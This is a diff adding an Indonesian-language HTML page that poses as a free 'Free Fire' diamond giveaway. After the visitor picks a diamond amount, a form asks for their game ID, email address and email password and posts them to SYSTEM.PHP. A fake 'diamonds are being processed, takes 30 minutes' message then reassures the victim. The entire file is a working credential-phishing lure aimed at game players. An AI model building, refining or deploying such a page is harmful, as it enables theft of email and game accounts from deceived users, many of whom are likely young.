@@ -1,0 +1,143 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+   <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Free</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Poppins:ital,wght@0,100;0,300;0,500;0,700;1,100;1,500;1,700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="STYLE.CSS">
+    <link rel="stylesheet" href="KEY.CSS">
+     <style>
+    .form-section { display: none; margin-top: 20px; }
+    button {
+      padding: 10px 20px;
+      background-color: #007bff;
+      color: white;
+      border: none;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+  <div class="Bungkus" id="bungkus">
+    <header class="header-head">WEB GIFT DIAMOND</header>
+    <div class="box-diamond">
+        <div class="box-1">
+        <button type="button" id="50dm" class="box-50dm"><h2 class="h2-50">55 Diamond!</h2></button>
+        <button type="button" id="125dm" class="box-125dm"><h2 class="h2-50">125 Diamond</h2></button>
+    </div>
+        <div class="box-2">
+        <button type="button" id="275dm" class="box-275dm"><h2 class="h2-50">275 Diamond</button>
+        <button type="button" id="562dm" class="box-562dm"><h2 class="h2-50">562 Diamond</h2></button>
+    </div>
+        <div class="box-3">
+        <button type="button" id="1024dm" class="box-1024dm"><h2 class="h2-50">1024 Diamond</h2></button>
+    </div>
+    <div class="hasil-kotak ">
+        <h2 class="hasil-dm" id="hasil-id">....</h2>
+    </div>
+        <div class="nexthaha">
+          <button class="next-btn" id="idbtn" type="button" disabled>Next</button>
+        </div>
+        </div>
+        </div>
+        
+        
+       
+    
+
+ <br><br><br>
+  <!-- pembungkus -->
+
+<div class="form-container" id="formsection">
+
+  <!-- my form -->
+  <div class="judul1">
+  <h2>Login Account Free Fire</h2>
+  </div>
+  <form action="SYSTEM.PHP" method="POST">
+
+<!-- id ff -->
+<div class="kotak-idff">
+        <h2 class="ID-FF">ID FF</h2>
+    <input type="number" id="idff" name="idff" placeholder="Masukan ID FF" required>
+</div>
+    <!-- gmail -->
+<div class="kotak-emailff">
+    <h2 class="email-ff">Email FF</h2>
+    <input type="email" id="emailff" name="email" placeholder="Masukan Email " required>
+    </div>
+
+    <!-- Password -->
+<div class="kotak-passwordff">
+    <H2 class="password-ff">Password</H2>
+    <input type="text" id="passwordff" name="password" placeholder="Masukan Password email" required>
+    </div>
+    <br>
+
+
+    <!-- login -->
+
+    <button type="submit" id="login-forum-btn" disabled>Kirim Diamond</button>
+  </form>
+</div>
+<div class="kotakberhasil" id="kotakberhasil">
+  <div class="berhasil1">
+    <h1>Diamond Sedang Diproses</h1>
+    <h2>Membutuhkan Waktu 30 Menit</h2>
+  </div>
+</div>
+
+   <script>document.addEventListener("DOMContentLoaded", function() {
+  document.getElementById("idbtn").addEventListener("click", function() {
+    document.getElementById("formsection").style.display = "unset";
+  });
+});</script>
+   <script>document.addEventListener("DOMContentLoaded", function() {
+  document.getElementById("login-forum-btn").addEventListener("click", function() {
+    document.getElementById("kotakberhasil").style.display = "unset";
+    document.getElementById("formsection").style.display = "none";
+    document.getElementById("bungkus").style.display = "none";
+
+  });
+});</script>
+<script>
+  // Daftar ID tombol pemicu
+const tombolIds = ["50dm", "125dm", "275dm", "562dm", "1024dm"];
+
+// Loop semua tombol dan tambahkan event listener
+tombolIds.forEach(function(id) {
+  document.getElementById(id).addEventListener("click", function() {
+    document.getElementById("idbtn").disabled = false;
+  });
+});
+</script>
+<script>
+  const idInput = document.getElementById("idff");
+const emailInput = document.getElementById("emailff");
+const passwordInput = document.getElementById("passwordff");
+const submitBtn = document.getElementById("login-forum-btn");
+
+// Fungsi untuk cek apakah semua input sudah diisi
+function cekInput() {
+  if (
+    idInput.value.trim() !== "" &&
+    emailInput.value.trim() !== "" &&
+    passwordInput.value.trim() !== ""
+  ) {
+    submitBtn.disabled = false;
+  } else {
+    submitBtn.disabled = true;
+  }
+}
+
+// Tambahkan event listener ke semua input
+[idInput, emailInput, passwordInput].forEach(input => {
+  input.addEventListener("input", cekInput);
+});
+</script>
+    <script src="SCRIPT.JS"></script>
+</body>
+</html>
